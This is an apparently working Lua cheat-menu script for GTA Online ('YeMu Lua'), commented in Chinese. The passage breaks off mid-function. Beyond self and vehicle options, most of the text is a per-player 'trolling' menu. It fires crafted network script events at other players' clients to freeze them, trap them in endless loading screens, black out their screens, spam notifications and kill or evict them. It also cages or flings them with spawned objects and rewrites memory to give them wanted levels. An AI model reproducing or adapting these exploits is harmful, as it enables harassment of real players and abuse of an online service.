-------------------------------------------------------欢迎使用夜幕Lua-----------------------------------------------------------------
-------------------------------------------------------夜幕Lua的制作仅供学习，不与任何其他Lua作者有矛盾--------------------------------
-------------------------------------------------------夜幕Lua的代码并非所有都是夜幕团队制作-------------------------------------------
--分享使用请标明出处 否则无妈！！！
--未经允许私自改名者更无妈！！！
--要是想当个孤儿就当我没说！！！
--===========================================================================================================================(夜幕Lua纯免费，任何收费的都是无妈仔)
util.require_natives("natives-1651208000")
util.require_natives("natives-1640181023")
util.require_natives("natives-1660775568")
require "lib.yymmlib.natives"
require "lib.yymmlib.ymslua"
require "lib.yymmlib.load"
require"lib.yymmlib.YMsr"
require"lib.yymmlib.YMspo"
require"lib.yymmlib.main"
require"lib.yymmlib.YMchaofeng"
require"lib.yymmlib.yymmlib"
require "lib/yymmlib/YMcu"
local aalib = require("aalib")
local PlaySound = aalib.play_sound
local SND_ASYNC<const> = 0x0001
local SND_FILENAME<const> = 0x00020000

JSkey = require 'lib.JSkeyLib'
local scaleForm = require'lib.ScaleformLib'
local SFasd = scaleForm('instructional_buttons')

resources_dir = filesystem.scripts_dir() .. '/YMS/'
if not filesystem.is_dir(resources_dir) then
    util.toast("资源目录丢失,请确保已正确安装YMS")
end
ocoded_for = 1.66
is_loading = true
verbose = false
online_v = tonumber(NETWORK._GET_ONLINE_VERSION())
if online_v > ocoded_for then
    util.toast("此GTA在线模式版本，脚本已过期 (" .. online_v .. ", 该脚本开发于 " .. ocoded_for .. ").请自行加入夜幕官方群聊更新！")
util.stop_script()
end
----------------------------------
Version = 3.9
util.toast("欢迎使用夜幕Lua!\n" .. "还不快快进群！~") 
util.toast("快点打开夜幕脚本支持栏进群！~")
wait = util.yield
joaat = util.joaat
alloc = memory.alloc
getTime = util.current_time_millis
create_tick_handler = util.create_tick_handler
if SCRIPT_MANUAL_START and not SCRIPT_SILENT_START and gConfig.general.showintro then
	gShowingIntro = true
	local state = 0
	local timer <const> = newTimer()
	AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "clown_die_wrapper", PLAYER.PLAYER_PED_ID(), "BARRY_02_SOUNDSET", true, 20)
	local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("OPENING_CREDITS")
	util.create_tick_handler(function()
		if not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) then
			return
		end
		if state == 0 then
			SETUP_SINGLE_LINE(scaleform)
			ADD_TEXT_TO_SINGLE_LINE(scaleform, "YMLUA", "$font1.9", "HUD_COLOUR_YELLOW")
			ADD_TEXT_TO_SINGLE_LINE(scaleform, 'v' .. Version, "$font5", "HUD_COLOUR_GREEN")
			ADD_TEXT_TO_SINGLE_LINE(scaleform, PLAYER.GET_PLAYER_NAME(players.user()), "$font5", "HUD_COLOUR_RED")
			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_SINGLE_LINE")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_CREDIT_BLOCK")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
			state = 1
			timer.reset()
		end
		if timer.elapsed() >= 6000 and state == 1 then
			HIDE(scaleform)
			state = 2
			timer.reset()
		end

		GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleform, 255, 255, 255, 255, 0)
	end)
end

CONFIG_DIR = filesystem.resources_dir() .. 'Dclog\\'
filesystem.mkdirs(CONFIG_DIR)
LEGACY_SPIN_LOG_FILE = CONFIG_DIR .. "spin_log.json"
SPIN_LOG_FILE = CONFIG_DIR .. "spin_log_".. players.get_rockstar_id(players.user()) .. ".json"

local notification = b_notifications.new()
notification.notify("你好","欢迎使用夜幕Lua，尊贵的夜幕用户！")

local colors = {
green = 184,
red = 6,
yellow = 190,
black = 2,
white = 1,
gray = 3,
pink = 190,
purple = 49, 
blue = 11
}
function notification(message, color)
	local picture = "CHAR_SOCIAL_CLUB"
	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)
	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
		util.yield()
	end
	util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)
	title = "夜幕Lua"
	if color == colors.red or color == colors.red then
		subtitle = "~u~通知"
	elseif color == colors.black then
		subtitle = "~c~通知"
	else
		subtitle = "~u~通知"
	end
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, picture, true, 5, title, subtitle)
	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
	util.log(message)
end

local function player_toggle_loop(root, PlayerID, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(PlayerID) then util.stop_thread() end
        callback()
    end)
end
local spawned_objects = {}

local function get_transition_state(PlayerID)
    return memory.read_int(memory.script_global(((2689235 + 1) + (PlayerID * 453)) + 230))
end
local function get_interior_player_is_in(PlayerID)
    return memory.read_int(memory.script_global(((2689235 + 1) + (PlayerID * 453)) + 243)) 
end
local function is_player_in_interior(PlayerID)
    return (memory.read_int(memory.script_global(2689235 + 1 + (PlayerID * 453) + 243)) ~= 0)
end
local function BlockSyncs(PlayerID, callback)
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= PlayerID then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "on")
		end
	end
	util.yield(10)
	callback()
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= PlayerID then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "off")
		end
	end
end

local function get_blip_coords(bliPlayerID)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(bliPlayerID)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end
local function request_model(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
end
local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}
local launch_vehicle = {"向上", "向前", "向后", "向下", "翻滚"}
local invites = {"游艇", "办公室", "会所", "办公室车库", "载具改装铺", "公寓"}
local unwanted_vehicles = {"cargoplane", "tug", "jet", "skylift", "towtruck", "towtruck2", "dump"}
local cleanse = { "清除NPC", "清除载具", "清除物体", "清除可拾取物体", "清除绳索", "清除投掷物"}
local drivingStyles = {786603, 1074528293, 8388614, 1076, 2883621, 786468, 262144, 786469, 512, 5, 6}
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}
local self = menu.list(menu.my_root(), "自我选项", {}, "")
local jiashi = menu.list(menu.my_root(), "载具选项", {}, "")
local zidongrenwu = menu.list(menu.my_root(), "任务选项（含恢复选项）", {}, "")
local funfeatures = menu.list(menu.my_root(), "娱乐选项", {}, "")
local weapon = menu.list(menu.my_root(), "武器选项", {}, "")
local fanyiyuyan = menu.list(menu.my_root(), "聊天选项", {}, "")
local quanju = menu.list(menu.my_root(), "全局选项", {}, "")
local sc = menu.list(menu.my_root(), "模组选项", {""}, "目前仅支持xml模型文件！")
local bailOnAdminJoin = false
local protections = menu.list(menu.my_root(), "保护选项", {}, "")
local online = menu.list(menu.my_root(), "线上选项", {}, "")
menu.toggle(protections, "R*开发人员加入反应", {}, "", function(on)
    bailOnAdminJoin = on
end)
local function player(PlayerID)   
    if players.get_rockstar_id(PlayerID) == 143069730 then
        util.toast(lang.get_string(0xD251C4AA, lang.get_current()):gsub("{(.-)}", {player = players.get_name(PlayerID), reason = "此战局检测到夜幕Lua作者.\n(也可能是虚假RID)"}), TOAST_DEFAULT)
    end
menu.divider(menu.player_root(PlayerID), "夜幕脚本")
    local bozo = menu.list(menu.player_root(PlayerID), "夜幕脚本", {"YMScript"}, "")
    local friendly = menu.list(bozo, "友好选项", {}, "")
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    menu.toggle_loop(friendly, "给予载具无敌", {}, "大多数菜单不会将其检测为载具无敌", function()
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(player), true, true, true, true, true, 0, 0, true)
        end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(player), false, false, false, false, false, 0, 0, false)
    end)
    menu.action(friendly, "修复载具", {}, "帮他修车.", function() 
        repair_player_vehicle(PlayerID) 
    end)
    menu.action(friendly,"升级车辆", {}, "", function()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local vehicle = PED.GET_VEHICLE_PED_IS_USING(player_ped)
    request_control_of_entity(vehicle)
    upgrade_vehicle(vehicle)
    end)
    menu.action(friendly, "修复加载屏幕", {}, "尝试用传送方法修复无限加载屏幕", function()
        menu.trigger_commands("givesh" .. players.get_name(PlayerID))
        menu.trigger_commands("aptme" .. players.get_name(PlayerID))
    end)
    menu.action(friendly, "给予25等级", {}, "给予该玩家 17 万RP经验,可从 1 级提升至 25 级.\n一名玩家只能用一次嗷", function()
        menu.trigger_commands("givecollectibles" .. players.get_name(PlayerID))
    end)
    local trolling = menu.list(bozo, "恶搞选项", {}, "")
    local trolling2 = menu.list(bozo, "恶搞选项2", {}, "恶搞种类太多，后续恶搞会在此选项里")
    player_toggle_loop(trolling, PlayerID, "将玩家推向前方", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        request_model(glitch_hash)
        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        entities.delete_by_handle(dumb_object_front)
        entities.delete_by_handle(dumb_object_back)
        util.yield()    
    end)
    local glitchVeh = false
    local glitchVehCmd
    glitchVehCmd = menu.toggle(trolling, "鬼畜载具", {}, "", function(toggle) -- credits to soul reaper for base concept
        glitchVeh = toggle
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(player)
        local veh_model = players.get_vehicle_model(PlayerID)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        request_model(ped_hash)
        request_model(object_hash)
        
        while glitchVeh do
            if not PED.IS_PED_IN_VEHICLE(player, player_veh, false) then 
                util.toast("玩家不在车内. :/")
                menu.set_value(glitchVehCmd, false);
            break end
            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("没有空出来的座位. :/")
                menu.set_value(glitchVehCmd, false);
            break end
            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_ped)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end
            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        util.yield()
                    end
                end
            end
            util.yield()
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then -- 在这里添加了第二阶段,因为它有时无法删除.
                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end)
    local glitchForcefield = false
    local glitchforcefield_toggle
    glitchforcefield_toggle = menu.toggle(trolling, "范围删除", {}, "启用后会将此玩家附近的模型删除", function(toggled)
        glitchForcefield = toggled
        local glitch_hash = util.joaat("p_spinning_anus_s")
        request_model(glitch_hash)
        while glitchForcefield do
            local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
            
            if PED.IS_PED_IN_ANY_VEHICLE(player, true) then
                util.toast("玩家在载具中. :/")
                menu.set_value(glitchforcefield_toggle, false);
            break end
            
            local stuPlayerID_object = entities.create_object(glitch_hash, playerpos)
            ENTITY.SET_ENTITY_VISIBLE(stuPlayerID_object, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stuPlayerID_object, true)
            ENTITY.SET_ENTITY_COLLISION(stuPlayerID_object, true, true)
            util.yield()
            entities.delete_by_handle(stuPlayerID_object)
            util.yield()    
        end
    end)
    player_toggle_loop(trolling, PlayerID, "弹飞玩家", {"Bouncetheplayer"}, "也适用于载具", function() 
        local poopy_butt = util.joaat("adder")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        pos.z -= 10
        request_model(poopy_butt)
        local vehicle = entities.create_vehicle(poopy_butt, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, false)
        util.yield(250)
        if vehicle ~= 0 then
            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 100, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
        util.yield(250)
        entities.delete_by_handle(vehicle)
    end)
    local freeze = menu.list(trolling, "冻结选项", {}, "")
    player_toggle_loop(freeze, PlayerID, "暴力冻结", {}, "使玩家无法控制移动和视角", function()
        util.trigger_script_event(1 << PlayerID, {-93722397, PlayerID, 0, 0, 0, 0, 0})
        util.yield(500)
    end)
    player_toggle_loop(freeze, PlayerID, "模型冻结", {}, "使玩家的模型无法移动", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
    end)
    local inf_loading = menu.list(trolling, "无限加载屏幕", {}, "")
    menu.action(inf_loading, "传送邀请", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {-555356783, PlayerID, 0, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(PlayerID), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)
    menu.action(inf_loading, "公寓邀请", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {-1390976345, PlayerID, PlayerID, -1, 1, 115, 0, 0, 0})
    end)
        
    menu.action_slider(inf_loading, "资产邀请", {}, "单击以选择样式", invites, function(index, name)
        pluto_switch name do
            case "游艇":
            util.trigger_script_event(1 << PlayerID, {1111927333, PlayerID, 1})
            util.toast("游艇邀请已发送")
            break
            case "办公室":
            util.trigger_script_event(1 << PlayerID, {1111927333, PlayerID, 2})
            util.toast("办公室邀请已发送")
            break
            case "会所":
            util.trigger_script_event(1 << PlayerID, {1111927333, PlayerID, 3})
            util.toast("会所邀请已发送")
            break
            case "办公室车库":
            util.trigger_script_event(1 << PlayerID, {1111927333, PlayerID, 4})
            util.toast("办公室车库邀请已发送")
            break
            case "载具改装铺":
            util.trigger_script_event(1 << PlayerID, {1111927333, PlayerID, 5})
            util.toast("载具改装铺邀请已发送")
            break
            case "公寓":
            util.trigger_script_event(1 << PlayerID, {1111927333, PlayerID, 6})
            util.toast("公寓邀请已发送")
            break
        end
    end)
    player_toggle_loop(trolling, PlayerID, "使该玩家黑屏", {}, "将此玩家传送到会所来达到黑屏", function()
        util.trigger_script_event(1 << PlayerID, {-555356783, PlayerID, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(PlayerID), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.yield(1000)
    end)
menu.action(trolling, "驱逐玩家", {"evict"}, "将玩家踢出室内.", function()
        if players.is_in_interior(PlayerID) then
            menu.trigger_commands("interiorkick" .. players.get_name(PlayerID))
        else
            notification("玩家不在室内", colors.black)
        end
end)
local cage = menu.list(trolling, "笼子选项", {}, "")
menu.action(cage, "笼子", {""}, "", function ()
    ptlz(PlayerID)
end)
menu.action(cage, "七度空间", {""}, "", function ()
    qdkj(PlayerID)
end)
menu.action(cage, "钱笼子", {""}, "", function ()
    zdlz(PlayerID)
end)
menu.action(cage, "垃圾箱", {""}, "", function ()
    yylz(PlayerID)
end)
menu.action(cage, "小车车", {""}, "", function ()
    cclz(PlayerID)
end)
menu.action(cage, "圣诞快乐", {""}, "", function ()
    sdkl1(PlayerID)
end)
menu.action(cage, "圣诞快乐pro", {""}, "", function ()
    sdkl2(PlayerID)
end)
menu.action(cage, "圣诞快乐promax", {""}, "", function ()
    sdkl3(PlayerID)
end)
menu.action(cage, "竞技管", {""}, "", function ()
    jjglz(PlayerID)
end)
menu.action(cage, "英国女王笼子", {""}, "", function(cl)
    gueencage(PlayerID)
end)
menu.action(cage, "载具笼子", {"cage4321"}, "", function()
    vehcagelol(PlayerID)
end)
menu.action(cage, "燃气笼", {"gascage4321"}, "", function()
    gascage(PlayerID)
end)
    menu.action(cage, "电击笼子", {"electriccage"}, "在此玩家周围生成电击器来困住玩家", function(cl)
        local number_of_cages = 4
        local elec_box = util.joaat("prop_elecbox_12")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        pos.z -= 0.5
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.1)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90, 0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)
    
    menu.action(cage, "斜坡笼子", {}, "在此玩家上方生成一个斜坡来困住玩家", function()
        local ramp_hash = util.joaat("prop_jetski_ramp_01")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
        request_model(ramp_hash)
        local ramp_cage = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)
        spawned_objects[#spawned_objects + 1] = ramp_cage
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ramp_cage)
    end)
    menu.action(cage, "集装箱笼子", {"cage"}, "生成一个集装箱来困住玩家", function()
        local container_hash = util.joaat("prop_container_05a")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player, 0, 0, -1)
        local rot = ENTITY.GET_ENTITY_ROTATION(player, 2)
        request_model(container_hash)
        local container = OBJECT.CREATE_OBJECT(container_hash, pos.x, pos.y, pos.z, true, false, true)
        spawned_objects[#spawned_objects + 1] = container
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(container)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)
    menu.action(cage, "删除所有生成的笼子", {"clearcages"}, "删除非自动套笼", function()
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount += 1
        end
        util.toast("删除了 " .. entitycount .. " 个已生成的笼子")
    end)
    local cage_loop = false
	menu.toggle(cage, "全自动系统套笼", {""}, "全新的自动套笼系统", function(on)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
		cage_loop = on
		if cage_loop then
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(PlayerID).." on")
				util.yield(300)
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					notification("踢出载具失败", colors.red)
					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(PlayerID).." off")
					return
				end
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(PlayerID).." off")
				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
			end
			cage_player(a)
		end
		while cage_loop do
			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)) 
			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then 
				a = b
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					goto continue
				end
				cage_player(a)
				notification(PLAYER.GET_PLAYER_NAME(PlayerID).."休想逃，嘿嘿，再次套住", colors.black)
				::continue::
			end
			util.yield(1000)
		end
	end)
	menu.action(cage, "删除全自动笼子", {""}, "此选项只能删除全自动所刷出的笼子", function() -- ez fix but lazy
		for key, value in pairs(cages) do
			entities.delete_by_handle(value)
		end
	end)

    menu.action(trolling, "杀死室内玩家", {}, "若此玩家在公寓则无法使用(仅对绿玩有效)", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        util.trigger_script_event(1 << PlayerID, {-1388926377, PlayerID, -1762807505, math.random(0, 9999)})
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)
    player_toggle_loop(trolling, PlayerID, "循环电击枪", {}, "在此玩家周围生成电击枪发射音效", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        for i = 1, 50 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
        end
        util.yield(100)
    end)
    player_toggle_loop(trolling, PlayerID, "循环原子能枪", {}, "在此玩家周围生成原子能枪发射音效", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z - 0.3, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_raypistol"), players.user_ped(), true, false, 1.0)
        util.yield(250)
    end)
    menu.action(trolling, "送进监狱", {}, "将此玩家传送到博林布鲁克监狱", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh " .. players.get_name(PlayerID))
        menu.trigger_commands("summon " .. players.get_name(PlayerID))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
    end)
    menu.action_slider(trolling, "发射玩家载具", {}, "", launch_vehicle, function(index, value)
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local veh = PED.GET_VEHICLE_PED_IS_IN(player, false)
        if not PED.IS_PED_IN_ANY_VEHICLE(player, true) then
            util.toast("玩家不在载具里. :/")
            return
        end
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            util.yield()
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and count >= 100 then
            util.toast("无法控制此玩家载具. :/")
            return
        end
        pluto_switch value do
            case "向上":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "向前":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "向后":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, -100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "向下":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, -100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "翻滚":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            end
        end)
    local soundspam = menu.list(trolling, "信息轰炸", {}, "")
    player_toggle_loop(soundspam, PlayerID, "垃圾短信", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {1670832796, PlayerID, math.random(-2147483647, 2147483647)})
    end)
    player_toggle_loop(soundspam, PlayerID, "室内邀请", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {1111927333, PlayerID, math.random(1, 6)})
    end)
    player_toggle_loop(soundspam, PlayerID, "资产邀请", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {-668341698, PlayerID, math.random(1, 150), -1, -1})
    end)
    player_toggle_loop(soundspam, PlayerID, "收集检查点", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {-1529596656, PlayerID, -547323955, 0, 0, 0, 0, 0, 0, 0, PlayerID, 0, 0, 0})
        util.yield(25)
    end)
    player_toggle_loop(soundspam, PlayerID, "NPC短信通知", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {-634789188, PlayerID, math.random(0, 178), 0, 0, 0})
    end)
    player_toggle_loop(soundspam, PlayerID, "错误通知", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {-1251171789, PlayerID, math.random(-2147483647, 2147483647)})
    end)    
    menu.action(trolling, "强制室内黑屏", {}, "玩家必须在公寓里,可以通过重新加入战局来撤销", function(s)
        if is_player_in_interior(PlayerID) then
            util.trigger_script_event(1 << PlayerID, {-1338917610, PlayerID, PlayerID, PlayerID, PlayerID, math.random(-2147483647, 2147483647), PlayerID})
        else
            util.toast("玩家不在公寓里. :/")
        end
    end)
    menu.action(trolling, "送她一颗卫星", {}, "在该玩家面前刷出雷达", function()
        local radar = util.joaat("prop_air_bigradar")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        request_model(radar)
        local radar_dish = entities.create_object(radar, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), 0, 20, -3), ENTITY.GET_ENTITY_HEADING(player))
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(radar_dish)
        chat.send_message("加个微信吗，帅哥美女们！", false, true, true)
        util.yield(10000)
        entities.delete_by_handle(radar_dish)
    end)
    
    menu.click_slider(trolling, "给予通缉等级", {}, "", 1, 5, 5, 1, function(val)
        local playerInfo = memory.read_long(entities.handle_to_pointer(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)) + 0x10C8)
        while memory.read_uint(playerInfo + 0x0888) < val do
            for i = 1, 46 do
